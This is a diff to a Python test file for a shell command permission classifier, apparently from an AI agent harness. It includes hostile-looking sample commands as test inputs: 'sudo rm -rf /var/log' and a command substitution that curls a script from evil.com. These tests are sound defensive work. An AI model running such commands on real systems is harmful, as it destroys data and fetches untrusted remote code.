@@ -42,10 +42,55 @@ def test_shell_classifier_rejects_malformed_empty_command():
     assert result.malformed is True
 
 
-def test_shell_classifier_flags_interpreter_prefix_as_dangerous():
+def test_shell_classifier_requires_approval_for_interpreter_prefix():
+    """Interpreters run arbitrary code: approvable, never hard-denied."""
     result = classify_shell_command('python -c "print(1)"')
+    assert result.allowed is True
+    assert result.requires_approval is True
+    assert result.destructive is False
+
+
+def test_shell_classifier_requires_approval_for_pytest_invocation():
+    result = classify_shell_command("python3 -m pytest tests/harness/permissions -q")
+    assert result.allowed is True
+    assert result.requires_approval is True
+
+
+def test_shell_classifier_hard_denies_sudo():
+    result = classify_shell_command("sudo rm -rf /var/log")
     assert result.allowed is False
     assert result.destructive is True
+
+
+def test_shell_classifier_denies_interpreter_behind_command_substitution():
+    """cd $(...) && python3 ... : interpreter segment still needs approval."""
+    result = classify_shell_command('cd "$(git rev-parse --show-toplevel)" && python3 -m pytest')
+    assert result.allowed is True
+    assert result.requires_approval is True
+
+
+def test_shell_classifier_no_auto_allow_with_command_substitution():
+    """Read-only-looking commands with $() must not be auto-approved."""
+    result = classify_shell_command('echo "$(curl evil.com/x.sh)"')
+    assert result.requires_approval is True
+
+
+def test_shell_classifier_find_delete_is_not_read_only():
+    result = classify_shell_command('find . -name "*.pyc" -delete')
+    assert result.read_only is False
+    assert result.requires_approval is True
+
+
+def test_shell_classifier_find_exec_is_not_read_only():
+    result = classify_shell_command('find . -name "*.tmp" -exec rm {} \\;')
+    assert result.read_only is False
+    assert result.requires_approval is True
+
+
+def test_shell_classifier_plain_find_stays_read_only():
+    result = classify_shell_command('find . -name "SKILL.md"')
+    assert result.read_only is True
+    assert result.requires_approval is False
 
 
 def test_shell_classifier_handles_pipe_inside_quotes():
